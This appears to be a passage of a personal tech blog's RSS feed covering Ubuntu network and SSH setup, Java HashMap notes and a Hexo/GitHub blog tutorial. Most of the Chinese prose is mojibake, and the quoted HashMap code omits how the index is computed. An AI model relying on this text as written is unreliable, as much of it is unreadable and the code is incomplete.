&lt;p>Ubuntuè®¾ç½®IPå¾ç¥&lt;/p>
&lt;ol>
&lt;li>å¯å¨èææºUbuntuç³»ç»ï¼æå¼ç»ç«¯ï¼å©ç¨å¦ä¸å½ä»¤æå¼å¹¶ç¼è¾ç½ç»æ¥å£éç½®æä»¶ï¼&lt;/li>
&lt;/ol>
&lt;p>sudo vi /etc/network/interfaces
2. ç¼è¾æä»¶å¦ä¸ï¼&lt;/p>
&lt;p>å¤å¶ä»£ç 
auto lo
iface lo inet loopback&lt;/p>
&lt;h1 id="assgin-static-ip-by-eric-on-26-sep-2012">Assgin static IP by eric on 26-SEP-2012&lt;/h1>
&lt;p>iface eth0 inet static
address 192.168.91.200 #change to your static IP
netmask 255.255.255.0 #change to your netmask
gateway 192.168.91.2 #change to your getway
#We must specify dns-nameserver here
#in order to get internet access from host
dns-nameservers 192.168.91.2
auto eth0
å¤å¶ä»£ç 
è¯´æ&lt;/p>
&lt;p>addressæ¯ä½ è¦åéç»ä½ èææºçéæIPå°åï¼å¯ä»¥ä»åææä»¬æ¾å°çå¯ç¨çå­ç½IPèå´ä¸­éä¾¿éæ©ä¸ä¸ªæ¾å¨æ­¤å¤ã&lt;/p>
&lt;p>netmaskæ¯å­ç½æ©ç &lt;/p>
&lt;p>gatewayæ¯ç½å³&lt;/p>
&lt;p>æ³¨æï¼å¨ç¸å¯¹è¾æ©ççæ¬ä¸­ï¼ä½ éè¦è®¾ç½®/etcä¸çresolv.confæä»¶ï¼å¹¶å å¥nameserverï¼è¿æ ·æå¯ä»¥è¿æ¥äºèç½ãä½å¨Ubuntu 12.04ä¹åï¼å·²ç»ä¸æ¨èè¿ç§æ¹å¼äºï¼å ä¸ºæ è®ºä½ æ³è¯¥éç½®æä»¶ä¸­è®¾ç½®ä»ä¹å¼ï¼éæ°å¯å¨ä¹åé½ä¼è¢«è¿åä¸ºåå§ç¶æãæ¨èçåæ³æ¯ç´æ¥å¨interfaceséç½®æä»¶ä¸­å å¥dns-nameserver &amp;lt;ç½å³IP&amp;gt;è¿ä¸è¡ã&lt;/p>
&lt;ol start="3">
&lt;li>éå¯ubuntuçç½å¡&lt;/li>
&lt;/ol>
&lt;p>sudo /etc/init.d/networking restart
4. pingæµè¯äºèç½è¿éæ§&lt;/p>
&lt;p>ping &lt;a href="http://www.baidu.com">www.baidu.com&lt;/a>
å¦æpingæååºï¼é£ä¹æ­åä½ ï¼ä½ å·²ç»æåå°èææºè®¾ç½®ä¸ºéæIPï¼å¹¶ä¸ä¹å·²è¿å¥äºèç½ã&lt;/p>
&lt;p>å¼å¯é²ç«å¢
ufw enable&lt;/p>
&lt;p>å³é­é²ç«å¢
ufw disable&lt;/p>
&lt;p>å¦æèææºéè½pingåæ¬æºï¼èæ¬æºå´pingä¸éèææºï¼æèèææºä¸è½pingéæ¬æºï¼å¯è½æå¦ä¸åå ï¼&lt;/p>
&lt;p>ä¸ï¼å¦ææ¯æ¡¥æ¥æ¨¡å¼ï¼é£ä¹å¯è½æ§1ï¼èææºé²ç«å¢ç¦pingï¼è¯·å³é­èææºé²ç«å¢éè¯ï¼å¯è½æ§2ï¼æ¡¥æ¥è®¾ç½®çipæå²çªæèæ¯èææºæ¡¥æ¥æå¡ä¸æ­£å¸¸ã&lt;/p>
&lt;p>äºï¼å¦ææ¯natæ¨¡å¼ï¼é£ä¹å¯è½æ§1ï¼èææºé²ç«å¢ç¦pingï¼è¯·å³é­èææºé²ç«å¢éè¯ï¼å¯è½æ§2ï¼æ¬æºä¸çvmnet8ç½å¡è¢«ç¦ç¨äºãå¯è½æ§3ï¼vboxçnatæ¨¡å¼ï¼vpcçå±äº«æ¨¡å¼ï¼æ¬æ¥å°±è¿æ ·çã&lt;/p>
&lt;p>ä¸ï¼å¦æä¸»æºåæ¶è£äºvisualboxåvmï¼ä¹ä¼å¯¼è´å¶ä¸­ä¸ä¸ªèææºpingä¸éä¸»æºï¼å æ­¤ä½¿ç¨vmævbæ¶ï¼å¨ä¸»æºä¸ç¦ç¨å¦ä¸ä¸ªèæç½å¡å³å¯ã&lt;/p>
&lt;p>SSHåå®¢æ·ç«¯openssh-clientåopenssh-server
å¦æä½ åªæ¯æ³ç»éå«çæºå¨çSSHåªéè¦å®è£openssh-clientï¼ubuntuæé»è®¤å®è£ï¼å¦ææ²¡æåsudo
apt-get install openssh-clientï¼ï¼å¦æè¦ä½¿æ¬æºå¼æ¾SSHæå¡å°±éè¦å®è£openssh-server
sudo apt-get install openssh-server
ç¶åç¡®è®¤sshserveræ¯å¦å¯å¨äºï¼
ps -e |grep ssh
å¦æçå°sshdé£è¯´æssh-serverå·²ç»å¯å¨äºã
å¦ææ²¡æåå¯ä»¥è¿æ ·å¯å¨ï¼sudo /etc/init.d/ssh start æè service ssh start
ssh-serveréç½®æä»¶ä½äº/etc/ssh/sshd_configï¼å¨è¿éå¯ä»¥å®ä¹SSHçæå¡ç«¯å£ï¼é»è®¤ç«¯å£æ¯22ï¼ä½ å¯ä»¥èªå·±å®ä¹æå¶ä»ç«¯å£å·ï¼å¦222ã
ç¶åéå¯SSHæå¡ï¼
sudo
/etc/init.d/ssh stop
sudo /etc/init.d/ssh start
ç¶åä½¿ç¨ä»¥ä¸æ¹å¼ç»éSSHï¼
ssh &lt;a href="mailto:username@192.168.1.112">username@192.168.1.112&lt;/a> usernameä¸º192.168.1.112 æºå¨ä¸çç¨æ·ï¼éè¦è¾å¥å¯ç ã&lt;/p>
&lt;p>å¨åå®è£å®ubuntuåï¼å±å¹ä¸è½å¨å±æ¾ç¤ºï¼æ­¤æ¶ï¼&lt;/p>
&lt;p>1ãå®è£VMware Tools&lt;/p>
&lt;p>æ­¥éª¤ï¼&lt;/p>
&lt;pre>&lt;code>1.1 è¿å¥ubuntuç³»ç»åï¼ç¹å»èææºä¸çãèææºã-&amp;gt;ãå®è£ vmware toolsãï¼åå°æ¡é¢åçå°ä¸ä¸ªvmware toolsç
&lt;/code>&lt;/pre>
&lt;p>cdromå¾æ ã&lt;/p>
&lt;pre>&lt;code>1.2 å¤å¶ VMwareTools-10.0.10-4301679.tar.gzï¼çæ¬æ ¹æ®èªå·±çå®éæåµï¼ å°/home/lance/ç®å½ä¸ã ç¨å½ä»¤ãtar -xzvf VMwareTools-10.0.10-4301679.tar.gzãè§£åã
1.3 è§£åå cd vmware_tools_distribï¼æå¼ç»ç«¯
1.4 è¾å¥âsudo ./vmware-install.plâï¼è¾å¥ç¨æ·å¯ç ä¾¿å¯å¼å§å®è£äºã
1.5 æ¥ä¸æ¥Nå¤çenterï¼Nå¤çYESï¼èªå·±æ¢æ¢æå§ã
1.6 ç´å°ä½ çå°âthe vmware team å reboot éå¯å³å¯
1.7 è¥è¿æ²¡æå¨å±æ¾ç¤ºï¼åå°èææºçãæ¥çã-&amp;gt;ãèªå¨è°æ´å¤§å°ã-&amp;gt;ãèªéåºå®¢æ·æºã,é½éä¸ãå³å¯å®ç°å¨å±ã
1.8 å®è£vmware toolså®ç°å¨å±åï¼å³ä¹å®ç°äºå¨ä¸»æºï¼WIN7ï¼åèææºVMware ï¼ubuntuï¼é´ç´æ¥ææ½æä»¶ã
&lt;/code>&lt;/pre>
&lt;p>enjoy yourself&lt;/p>
&lt;p>Ubuntu 16.04 æ§è¡ä¸é¢å½ä»¤é»è®¤å¯å¨å°å½ä»¤è¡ï¼
$ sudo systemctl set-default multi-user.target
æ§è¡å¦ä¸å½ä»¤å¯å¨å°æ¡é¢ï¼
$ sudo systemctl start lightdm&lt;/p></description></item><item><title>Record some java Function when I code on Leetcode</title><link>http://www.guozet.me/post/Record-some-java-Function-when-I-code-on-Leetcode/</link><pubDate>Fri, 11 May 2018 14:28:25 +0000</pubDate><guid>http://www.guozet.me/post/Record-some-java-Function-when-I-code-on-Leetcode/</guid><description>&lt;hr>
&lt;h1 id="hashmapç¸å³">HashMapç¸å³&lt;/h1>
&lt;h2 id="å¸¸ç¨å½æ°è¯´æ">å¸¸ç¨å½æ°è¯´æ&lt;/h2>
&lt;h2 id="å¦ä½å¨hashmapä¸­æå¥ç¸åçkeyå¼">å¦ä½å¨Hashmapä¸­æå¥ç¸åçkeyå¼&lt;/h2>
&lt;p>è¦å¨HashMapä¸­æå¥éå¤çå¼ï¼é¦åéè¦å¼æ¸æ¥HashMapéé¢æ¯æä¹å­æ¾åç´ çã&lt;br>
&lt;strong>putæ¹æ³&lt;/strong>: Mapéé¢å­æ¾çæ¯ä¸ä¸ªåç´ é½æ¯key-valueè¿æ ·çé®å¼å¯¹ï¼èä¸é½æ¯éè¿putæ¹æ³è¿è¡æ·»å çï¼èä¸ç¸åçkeyå¨Mapä¸­åªä¼æä¸ä¸ªä¸ä¹å³èçvalueå­å¨ãputæ¹æ³å¨Mapä¸­çå®ä¹å¦ä¸ã&lt;/p>
&lt;p>&lt;code>put(K key, V value);&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>put()æ¹æ³å®ç°ï¼é¦åhash(key)å¾å°keyçhashcode()ï¼hashmapæ ¹æ®è·å¾çhashcodeæ¾å°è¦æå¥çä½ç½®æå¨çé¾ï¼å¨è¿ä¸ªé¾éé¢æ¾çé½æ¯hashcodeç¸åçEntryé®å¼å¯¹ï¼å¨æ¾å°è¿ä¸ªé¾ä¹åï¼ä¼éè¿equals()æ¹æ³å¤æ­æ¯å¦å·²ç»å­å¨è¦æå¥çé®å¼å¯¹ï¼èè¿ä¸ªequalsæ¯è¾çå¶å®å°±æ¯keyã&lt;/p>
&lt;/blockquote>
&lt;!-- more -->
&lt;pre>&lt;code>public V put(K key,V value)
Parameters:
key - key with which the specified value is to be associated
value - value to be associated with the specified key
Return: the previous value associated with
key, or null if there was no mapping for key.
&lt;/code>&lt;/pre>
&lt;p>å®ç¨æ¥å­æ¾key-valueè¿æ ·çä¸ä¸ªé®å¼å¯¹ï¼è¿åå¼æ¯keyå¨Mapä¸­å­æ¾çæ§valueï¼å¦æä¹åä¸å­å¨åè¿ånullãHashMapçputæ¹æ³æ¯è¿æ ·å®ç°çã&lt;/p>
&lt;pre>&lt;code class="language-java">public V put(K key, V value) {
if (key == null)
return putForNullKey(value);
int hash = hash(key);
for (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != null; e = e.next) {
Object k;
if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) {
V oldValue = e.value;
e.value = value;
e.recordAccess(this);
return oldValue;
}
}
modCount++;
addEntry(hash, key, value, i);
return null;
}
&lt;/code>&lt;/pre>
&lt;p>ä»ä¸æä»¬å¯ä»¥çå°å¨æ·»å å¯¹åºçkey-valueè¿æ ·çç»åæ¶ï¼å¦æåæ¬å·²ç»å­å¨å¯¹åºçkeyï¼åç´æ¥æ¹åå¯¹åºçvalueï¼å¹¶è¿åæ§çvalueï¼èå¨å¤æ­keyæ¯å¦å­å¨çæ¶åæ¯åæ¯è¾keyçhashCodeï¼åæ¯è¾ç¸ç­æequalsçã
ç´æ¥ä»ä¸é¢ä»£ç æ¥çæ¯æ¯è¾çå¯¹åºMap.EntryçhashCodeåkeyçhashCodeï¼èå®éä¸Map.EntryçhashCodeå¶å®å°±æ¯å¶å­æ¾keyçhashCodeãèå¦æå¯¹åºçkeyåæ¬ä¸å­å¨çè¯å°è°ç¨addEntryå°å¯¹åºçkey-valueæ·»å å°Mapä¸­ãaddEntryä¼ éçåæ°hashå°±æ¯å¯¹åºkeyçhashCodeã
å®ç°æ·»å éå¤åç´ 
éè¿å¯¹put()æ¹æ³çç ç©¶ï¼æä»¬å¯ä»¥åç°ï¼å¤æ­keyæ¯å¦å­å¨çæ¶åæ¯åæ¯è¾keyçhashCodeï¼åæ¯è¾ç¸ç­æequalsçï¼æä»¥éåhashCode()åequals()æ¹æ³å³å¯å®ç°æ·»å éå¤åç´ ã&lt;/p>
&lt;pre>&lt;code class="language-java">@Override
public int hashCode(){
return this.arga.hashCode() * this.argb.hashCode() ;
}
@Override
public boolean equals(Object obj) {
if (this == obj) {
return true;
}
if (!(obj instanceof MyType)) {
return false;
}
MyType p = (MyType) obj;
if (this.arga.equals(p.arga) &amp;amp;&amp;amp; this.argb.equals(p.argb)) {
return true ;
} else {
return false ;
}
}
&lt;/code>&lt;/pre>
&lt;p>éåè¿ä¸¤ä¸ªæ¹æ³ä¹åå°±å¯ä»¥è¦çéå¤çé®å¼å¯¹ï¼å¦æéè¦å¯¹valueè¿è¡å å ï¼è°ç¨put()æ¹æ³ä¹åç¨containsKey()æ¹æ³å¤æ­æ¯å¦æéå¤çé®å¼ï¼å¦ææï¼åç¨get()æ¹æ³è·ååæçvalueï¼åå ä¸æ°å å¥çvalueå³å¯ã&lt;/p></description></item><item><title>ä½¿ç¨Hexo+Nextä¸»é¢+Githubæ­å»ºåå®¢</title><link>http://www.guozet.me/post/Use-Hexo-to-built-my-Blog/</link><pubDate>Thu, 10 May 2018 15:13:51 +0000</pubDate><guid>http://www.guozet.me/post/Use-Hexo-to-built-my-Blog/</guid><description>&lt;p>ä½¿ç¨Jekyllæ­å»ºå¨githubä¸åå®¢å·²ç»å¿«ä¸å¹´äºï¼ä½ä¸å¹´çæ¶é´å¹¶æ²¡æåå¾å¤çæç« ãä¸é¨ååå æ¯ç±äºèªå·±ææ ï¼å¦ä¸é¨åä¹ç±äºJekyllååå®¢æå¾å¤ä¸ä¾¿ä¹å¤ãä¸è½èªå¨çæç®å½ï¼ä»¥åæ¯æ¬¡æ°å»ºæç« é½éè¦èªå·±çæå¨è®¾ç½®ç®å½ç»æä»¥åæ·»å Jekyllè§£æçæ ¼å¼åå®¹å¨æ¯ä¸ç¯æç« ä¸­ï¼è¿æ¯ä¸ä»¶éå¸¸ç¹çèæ è¶£çå·¥ä½ãéµå¾ªèªå·±å¨æä¸°è¡£è¶³é£çååï¼æ¥è¯¢ç®åæ¯è¾æµè¡çæ­å»ºåå®¢çæ¹å¼ä¹åï¼å³å®ä½¿ç¨Hero+Nextä¸»é¢å¨githubä¸æ­å»ºåå®¢ãæ¬ç¯åå®¢è®°å½æ­å»ºè¿ç¨ä¸­çéç½®ä¸ä¼åã&lt;/p>
&lt;blockquote>
&lt;p>å·ä½æ­å»ºåå®¢è¿ç¨è¯·åèï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>
&lt;a href="https://www.ezlippi.com/blog/2016/02/jekyll-to-hexo.html" target="_blank" rel="noopener">Jekyllè¿ç§»å°Hexoæ­å»ºä¸ªäººåå®¢&lt;/a>&lt;br>
éåçæåççåå­¦ï¼ä½èè¯¦ç»çè®²è§£äºä½¿ç¨Hexoä¸Nextä¸»é¢æ­å»ºåå®¢çè¿ç¨ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦æå®å¨ä¸çæHexoçåçä»¥åä¹åæ²¡æä½¿ç¨è¿gitçåå­¦ï¼è¯·åèï¼&lt;br>
&lt;a href="https://ehlxr.me/2016/07/23/%E4%BD%BF%E7%94%A8Hexo%E5%9F%BA%E4%BA%8EGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="noopener">ä½¿ç¨ Hexo åºäº GitHub Pages æ­å»ºä¸ªäººåå®¢ï¼ä¸ï¼&lt;/a>&lt;br>
&lt;a href="https://ehlxr.me/2016/07/23/%E4%BD%BF%E7%94%A8Hexo%E5%9F%BA%E4%BA%8EGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89/" target="_blank" rel="noopener">ä½¿ç¨ Hexo åºäº GitHub Pages æ­å»ºä¸ªäººåå®¢ï¼äºï¼&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;!-- more -->
&lt;p>å®æHexoæ­å»ºåå®¢ä¹åï¼å¯ä»¥åèä¸äºéç½®è¯´æ,åä¸äºä¼åï¼&lt;/p>
&lt;p>
&lt;a href="https://ehlxr.me/2016/08/30/%E4%BD%BF%E7%94%A8Hexo%E5%9F%BA%E4%BA%8EGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89/" target="_blank" rel="noopener">ä½¿ç¨ Hexo åºäº GitHub Pages æ­å»ºä¸ªäººåå®¢&lt;/a>&lt;/p>
&lt;h1 id="hexoåºæ¬æä½">Hexoåºæ¬æä½&lt;/h1>
&lt;h3 id="åºæ¬å½ä»¤">åºæ¬å½ä»¤&lt;/h3>
&lt;pre>&lt;code class="language-sh">hexo new &amp;quot;postName&amp;quot; #æ°å»ºæç« 
hexo new page &amp;quot;pageName&amp;quot; #æ°å»ºé¡µé¢
hexo generate #çæéæé¡µé¢è³publicç®å½
hexo server #å¼å¯é¢è§è®¿é®ç«¯å£ï¼é»è®¤ç«¯å£4000ï¼'ctrl + c'å³é­serverï¼
hexo deploy #å°.deployç®å½é¨ç½²å°GitHub
hexo help # æ¥çå¸®å©
hexo version #æ¥çHexoççæ¬
hexo deploy -g #çæå é¨ç½²
hexo server -g #çæå é¢è§
å½ä»¤çç®å
hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h1 id="hexo-æç« å¾çç®¡ç">Hexo æç« å¾çç®¡ç&lt;/h1>
&lt;p>æ°æ å½¢æ¶å°ç´è§ï¼å¾å¤æ¶åä¸ä¸ªéå¾è½æ¸æ°çè¡¨è¾¾æä»¬çè§ç¹ãæä»¥ï¼æä»¬éè¦ç ç©¶Hexoåæç« æ¶æå¥å¾ççæ¹æ³ãä¸»è¦æä¸¤ç§æ¹å¼ï¼&lt;/p>
&lt;p>&lt;strong>æ¬å°å¼ç¨&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>éç¨åºæ¯ï¼ å°éå¾ç + Blogæ­è½½å¹³å°ç©ºé´åè¶³&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¼å¿ï¼ ç®æ´æ¹ä¾¿&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>è¿ç¨å¾åºå¼ç¨&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>éç¨åºæ¯ï¼æ·±åº¦ä½¿ç¨ç¨æ· + æç« æå¥å¾ççéæ±è¾é« + Blogæ­è½½å¹³å°ç©ºé´ä¸è¶³&lt;/li>
&lt;li>ä¼å¿ï¼ è½å¤æ»¡è¶³èªå·±æå¥å¾ççéæ±ï¼ä¸ç¨èèç©ºé´é®é¢&lt;/li>
&lt;li>ç¼ºç¹ï¼ æææç« ä¸­çå¾çåå¶äºè¿ç¨å¾åºæå¡å¨çéå¶ï¼å¦ææå¡å¨åºç°é®é¢ï¼ææå¾çé½ä¸è½å è½½äº&lt;/li>
&lt;/ul>
&lt;h2 id="æ¬å°å¼ç¨">æ¬å°å¼ç¨&lt;/h2>
&lt;h3 id="ç»å¯¹è·¯å¾å¼ç¨æéæ©çæ¹å¼éè¦è½å¤å¨é¦é¡µä¸æ¾ç¤ºå¾ç">ç»å¯¹è·¯å¾å¼ç¨(æéæ©çæ¹å¼ï¼éè¦è½å¤å¨é¦é¡µä¸æ¾ç¤ºå¾ç)&lt;/h3>
&lt;p>å½Hexoé¡¹ç®ä¸­åªç¨å°å°éå¾çæ¶ï¼å¯ä»¥å°å¾çç»ä¸æ¾å¨source/imagesæä»¶å¤¹ä¸­ï¼éè¿markdownè¯­æ³è®¿é®å®ä»¬ã&lt;/p>
&lt;blockquote>
&lt;p>source/images/image.jpg&lt;br>
&lt;code>![](/images/image.jpg)&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ä¼å¿ï¼å¾çæ¢å¯ä»¥å¨&lt;strong>é¦é¡µåå®¹ä¸­è®¿é®å°ï¼ä¹å¯ä»¥å¨æç« æ­£æä¸­è®¿é®å°&lt;/strong>ã&lt;/p>
&lt;h3 id="ç¸å¯¹è·¯å¾å¼ç¨">ç¸å¯¹è·¯å¾å¼ç¨&lt;/h3>
&lt;h4 id="éç½®ç«ç¹_configymlæä»¶">éç½®ç«ç¹_config.ymlæä»¶&lt;/h4>
&lt;p>å¦å¤ä¹å¯ä»¥å°å¾çæ¾å¨æç« èªå·±çç®å½ä¸­ãæç« çç®å½å¯ä»¥éè¿éç½®ç«ç¹_config.ymlæ¥çæã&lt;/p>
&lt;blockquote>
&lt;p>_config.yml&lt;br>
&amp;lsquo;post_asset_folder: true&amp;rsquo;&lt;/p>
&lt;/blockquote>
&lt;p>å°post_asset_folderè®¾ä¸ºtrueåï¼æ§è¡å½ä»¤ï¼&lt;br>
&lt;code>$ hexo new post_name&lt;/code>&lt;br>
å¨source/_postsä¸­ä¼çææç« post_name.mdåååæä»¶å¤¹post_nameãå°å¾çèµæºæ¾å¨post_nameä¸­ï¼æç« å°±å¯ä»¥ä½¿ç¨ç¸å¯¹è·¯å¾å¼ç¨å¾çèµæºäºã&lt;br>
&lt;code>_posts/post_name/image.jpg&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>åèåæï¼
&lt;a href="http://www.cnblogs.com/lmf-techniques/articles/6911051.html" target="_blank" rel="noopener">å¨ hexo ä¸­æ çä½¿ç¨æ¬å°å¾ç&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h4 id="markdownç´æ¥å¼ç¨å¾ç">Markdownç´æ¥å¼ç¨å¾ç&lt;/h4>
&lt;p>&lt;code>![](image.jpg)&lt;/code>&lt;/p>
&lt;p>ä¸è¿°æ¯markdownçå¼ç¨æ¹å¼ï¼å¾çæ¾å¨æç« æå¨çç®å½ä¸ï¼æèå­ç®å½ä¸ï¼å¾çåªè½å¨æç« ä¸­æ¾ç¤ºï¼ä½æ æ³å¨é¦é¡µä¸­æ­£å¸¸æ¾ç¤ºã&lt;/p>
&lt;p>å¦æå¸æå¾çå¨æç« åé¦é¡µä¸­åæ¶æ¾ç¤ºï¼å¯ä»¥ä½¿ç¨æ ç­¾æä»¶è¯­æ³ã&lt;/p>
&lt;blockquote>
&lt;p>_posts/post_name/image.jpg&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>{% asset_img image.jpg This is an image %}
&lt;/code>&lt;/pre>
&lt;h2 id="è¿ç¨å¾åºå¼ç¨">è¿ç¨å¾åºå¼ç¨&lt;/h2>
&lt;p>é¤äºå¨æ¬å°å­å¨å¾çï¼è¿å¯ä»¥å°å¾çä¸ä¼ å°ä¸äºåè´¹çCDNæå¡ä¸­ãæ¯å¦Cloudinaryæä¾çå¾çCDNæå¡ï¼å¨Cloudinaryä¸­ä¸ä¼ å¾çåï¼ä¼çæå¯¹åºçurlå°åï¼å°å°åç´æ¥æ¿æ¥å¼ç¨å³å¯ã&lt;/p>
&lt;blockquote>
&lt;p>åèåæï¼
&lt;a href="https://mapan.tech/posts/c9c3.html" target="_blank" rel="noopener">ä½¿Hexoæç« å¾æå¹¶è&lt;/a>&lt;br>
è¯¥ç¯æç« è¯¦ç»è®²è§£å¦ä½ä½¿ç¨æ°æµªå¾®åå¾åºæ¥å®ç°å¨Hexoæç« ä¸­æå¥å¾ç&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h1 id="hexoççæ¬æ§å¶æ¹å¼">Hexoççæ¬æ§å¶æ¹å¼&lt;/h1>
&lt;p>æä»¬å°Hexoçåºæ¥çéæç½ç«æ¾å°äºGithub Pagesä¸é¢å»æç®¡äºãèæä»¬ä¸è¬ä¹å¨å¨æ¬å°æ­å»ºHexoçç¯å¢ï¼ç¼åæ°æç« ï¼ç¶åå©ç¨hexo deployæ¥åå¸å°Gitï¼é£ä¹å¯¹äºæ¬å°çHexoçåå§æä»¶æä¹ç®¡çå¢ï¼ç®¡çHexoçåå§æä»¶çå¥½å¤æ¯ï¼&lt;/p>
&lt;ul>
&lt;li>æ¢çµèå¸ç½®ç¯å¢éå¸¸æ¹ä¾¿&lt;/li>
&lt;li>ä¸ç¨æå¿æ¬å°ç¯å¢æäºå¯¼è´æºæä»¶æµå¤±ï¼æ¯ç«ä¸æè¾å°±å®¹ææåç¯å¢ç&lt;/li>
&lt;/ul>
&lt;p>æä»¬å¯ä»¥æHexoåå®¢çæºæä»¶ä¹Hostå¨githubä¸ï¼è¿éæä»¬å¯ä»¥éæ©æHexoåå®¢çæºæä»¶å¸ç½®å°åBlogåä¸ä¸ª&lt;code>username.github.io&lt;/code>ä»åºï¼ä¹å¯ä»¥éæ©å°Hexoçæºæä»¶æ¨å°æ°å»ºçä¸ä¸ªGithub Repo.&lt;/p>
&lt;h2 id="å©ç¨githubåæ¯è¿è¡çæ¬æ§å¶">å©ç¨Githubåæ¯è¿è¡çæ¬æ§å¶&lt;/h2>
&lt;h3 id="å©ç¨åæ¯è¿è¡çæ¬æ§å¶çæµç¨">å©ç¨åæ¯è¿è¡çæ¬æ§å¶çæµç¨&lt;/h3>
&lt;p>éè¿æ°å»ºä¸ä¸ªhexoåæ¯ç¨äºä¸é¨å­æ¾hexoä»£ç ãååçmasteråæ¯ä¾ç¶ä¸åï¼ä½ä¸ºhexoé¨ç½²çåæ¯ã
æ¯æ¬¡å¨é¨ç½²åï¼åæä»£ç æäº¤å°hexoåæ¯:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>å°è¾¾Blogçæ¬å°æä»¶æ ¹ç®å½ï¼æ¬å°åå»ºgitä»åº&lt;br>
&lt;code>git init&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ·»å è¿ç¨åº&lt;br>
&lt;code>git remote add origin git@github.com:user.name/user.name.github.io&lt;/code>&lt;br>
æ³¨æï¼å°å¶ä¸­çä¸¤ä¸ªuser.nameç½®æ¢æä½ èªå·±çgithubåç§°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åå»ºhexoåæ¯&lt;br>
&lt;code>git checkout -b hexo&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ·»å æä»¶å¹¶æäº¤ï¼pushå°è¿ç¨ä»åº&lt;br>
&lt;code>git add&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>å¯è½åºç°çé®é¢ï¼å¦æä½ ä½¿ç¨äºç¬¬ä¸æ¹ä¸»é¢ï¼å¨è¿è¡ä»£ç æäº¤çæ¶åï¼æ¯æ æ³å°ç¬¬ä¸æ¹ä¸»é¢æäº¤å°ä½ çgithub repositoryä¸­ï¼ä¼åºç° untracked contentçæç¤ºã&lt;br>
**åå ï¼**ç¬¬ä¸æ¹ä¸»é¢èªèº«å°±æ¯ä¸ä¸ªgité¡¹ç®ï¼æ¯æ²¡æåæ³å°æ¯äººçgité¡¹ç®éè¿addåcommitçæ¹å¼æ·»å å°èªå·±çgit repositoryçã&lt;br>
&lt;strong>è§£å³æ¹å¼ï¼&lt;/strong> å é¤ç¬¬ä¸æ¹ä¸»é¢æ ¹ç®å½ä¸é¢ç.gitæä»¶å¤¹ï¼åå°è¯æäº¤git add&lt;/p>
&lt;/blockquote>
&lt;h3 id="æ¥å¸¸æ¹å¨è¿ç¨ä¸­çæ§è¡æµç¨">æ¥å¸¸æ¹å¨è¿ç¨ä¸­çæ§è¡æµç¨ï¼&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ä¾æ¬¡æ§è¡git add .ãgit commit -m &amp;ldquo;&amp;hellip;&amp;quot;ãgit push origin hexoæä»¤å°æ¹å¨æ¨éå°GitHubï¼æ­¤æ¶å½ååæ¯åºä¸ºhexoï¼ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ§è¡hexo g -dåå¸ç½ç«å°masteråæ¯ä¸ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="æ¬å°èµæä¸¢å¤±æèæ¢çµèå¨å¶ä»çµèä¸é¢ä¿®æ¹åå®¢çæ­¥éª¤æµç¨">æ¬å°èµæä¸¢å¤±æèæ¢çµèï¼å¨å¶ä»çµèä¸é¢ä¿®æ¹åå®¢çæ­¥éª¤æµç¨&lt;/h3>
&lt;ul>
&lt;li>ä½¿ç¨ &lt;code>git clone git@github.com:user.name/user.name.github.io.git&lt;/code>(é»è®¤çåæ¯ä¸ºhexo)&lt;/li>
&lt;li>å¨æ¬å°cloneä¸æ¥çuser.name.github.ioæä»¶å¤¹ä¸é¢éè¿git bashä¾æ¬¡æ§è¡ä»¥ä¸æä»¤ï¼&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-sh">npm install -g hexo-cli
npm install hexo --save
npm install hexo-deployer-git
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>åèåå®¢&lt;br>
&lt;a href="http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/#more" target="_blank" rel="noopener">GitHub Pages + Hexoæ­å»ºåå®¢&lt;/a>&lt;br>
&lt;a href="http://chenhuichao.com/2016/02/22/hexo/hexo-guide-3/" target="_blank" rel="noopener">Hexoåå®¢ä»£ç çæ¬æ§å¶&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h1 id="å¶ä»åè½åèç½é¡µ">å¶ä»åè½åèç½é¡µ&lt;/h1>
&lt;hr>
&lt;h2 id="åå®¢é¦é¡µçæ¾ç¤ºé®é¢">åå®¢é¦é¡µçæ¾ç¤ºé®é¢&lt;/h2>
&lt;h3 id="åå®¹å¨é¨æ¾ç¤ºä¸æ¶ç¼©">åå®¹å¨é¨æ¾ç¤ºï¼ä¸æ¶ç¼©&lt;/h3>
